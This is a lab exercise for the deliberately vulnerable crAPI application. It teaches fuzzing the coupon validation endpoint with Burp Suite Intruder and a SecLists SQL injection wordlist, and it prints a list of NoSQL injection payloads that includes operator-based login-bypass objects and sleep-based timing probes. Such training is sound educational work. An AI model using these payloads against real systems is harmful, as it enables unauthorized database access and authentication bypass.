# 🔍 Fuzzing Input in crAPI

## 🧠 Learning Objectives
- Understand the concept and purpose of fuzz testing.
- Apply fuzzing techniques to identify potential SQL/NoSQL injection points.
- Learn how to interpret response baselines during fuzzing.

---

Fuzz testing is a technique where input data that is either invalid, unexpected, or random is used as input for an application. Fuzzing is usually automated, allowing testers to inject many variations of input efficiently.

There are two main approaches:
- **Random generation**: Dynamically generated combinations of characters and numbers.
- **Wordlist-based**: Using premade lists of known payloads or patterns.

The latter is especially suitable for web application testing, as it is faster and aligns well with known vulnerability patterns.

> In previous exercises, you already used fuzzing:
> - **Dictionary attack** = fuzzing login inputs
> - **API enumeration** = fuzzing the URL path

This time, you will use fuzzing to uncover **potential SQL or NoSQL injection vulnerabilities** by fuzzing request bodies.

---

## ⚙️ Prerequisites

Before starting, make sure you have completed [Exercise 6 - Basic Token Attacks](6_Basic_Token_Attacks.md) to ensure you are familiar with tools like **Burp Suite Intruder**.

---

## 🕵️‍♂️ Discovering SQL Injection with Fuzzing

You’ll begin by trying to discover a possible **SQL injection** vulnerability in crAPI’s **coupon validation** endpoint.

### 📌 Steps

1. In Burp Suite, capture a **coupon validation** request.
2. Send the request to **Intruder**.
3. Highlight the value of `coupon` and mark it as the **payload position**.
4. Use the wordlist **`Generic-SQLI`** from **Seclists** as payload.  
   - 📁 Example path in Kali Linux: `/usr/share/seclists/Fuzzing/Generic-SQLi.txt`
5. Run the attack.
6. Observe the responses:
   - What are the baseline **status codes** and **content lengths**?
   - Which responses differ from the baseline?

> 🔍 A "baseline" is the common status code and content length returned for normal (non-malicious) input. Deviations from this may indicate a vulnerability.

If no anomalies are found, the backend may use a **NoSQL** database instead. In that case, try fuzzing with **NoSQL-specific** payloads.

---

## 🧬 Discovering NoSQL Injection with Fuzzing

**NoSQL injection** works differently from SQL injection. It often resembles code injection rather than string manipulation.

> ⚠️ **Important**: Avoid wrapping NoSQL payloads in quotation marks (`" "`), as they are not treated as strings.

### 📌 Steps

1. Create a small **custom wordlist** with NoSQL payloads.  
   You can use the list below:

<details>
<summary>Click to view NoSQL Payload Wordlist</summary>

```
true
$where: '1 == 1'
, $where: '1 == 1'
$where: '1 == 1'
', $where: '1 == 1
1, $where: '1 == 1'
{ $ne: 1 }
', $or: [ {}, { 'a':'a
' } ], $comment:'successful MongoDB injection'
db.injection.insert({success:1});
db.injection.insert({success:1});return 1;db.stores.mapReduce(function() { { emit(1,1
|| 1==1
|| 1==1//
|| 1==1%00
}, { password : /.*/ }
' && this.password.match(/.*/)//+%00
' && this.passwordzz.match(/.*/)//+%00
'%20%26%26%20this.password.match(/.*/)//+%00
'%20%26%26%20this.passwordzz.match(/.*/)//+%00
{$gt: ''}
[$ne]=1
';sleep(5000);
';it=new%20Date();do{pt=new%20Date();}while(pt-it<5000);
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$ne": "foo"}, "password": {"$ne": "bar"}}
{"username": {"$gt": undefined}, "password": {"$gt": undefined}}
{"username": {"$gt":""}, "password": {"$gt":""}}
{"username":{"$in":["Admin", "4dm1n", "admin", "root", "administrator"]},"password":{"$gt":""}}
{"$ne": null}
```

</details>

2. Clear the previous payload list in **Intruder**.
3. Load your new NoSQL wordlist as the payload.
4. Run the attack.
5. Watch for **anomalous status codes** or **unexpected content lengths**.

> 🎯 You should discover **at least one** request with a suspiciously different response, indicating a potential injection point.

---

## 💬 Reflection

- What patterns did you observe in the response behavior?
- Why are baseline values important for identifying injection responses?
- How does fuzzing differ between SQL and NoSQL injection attempts?
- What limitations or risks are associated with blind fuzzing?

---

## ⚠️ Ethical Reminder

These techniques are meant for **educational purposes only** and should **never** be used outside authorized lab environments like crAPI.

Performing fuzzing or injection testing on systems without explicit permission may be illegal and unethical.

---
